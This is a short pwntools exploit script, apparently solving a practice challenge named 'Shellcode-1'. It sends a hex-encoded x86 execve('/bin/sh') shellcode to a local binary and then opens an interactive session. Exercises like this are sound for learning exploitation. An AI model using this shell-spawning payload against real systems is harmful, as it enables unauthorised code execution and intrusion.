from pwn import* 

p = process('./Shellcode-1')

payload = b"31C9F7E151682F2F7368682F62696E89E3040AFEC0CD80"

p.sendline(payload)
p.interactive()
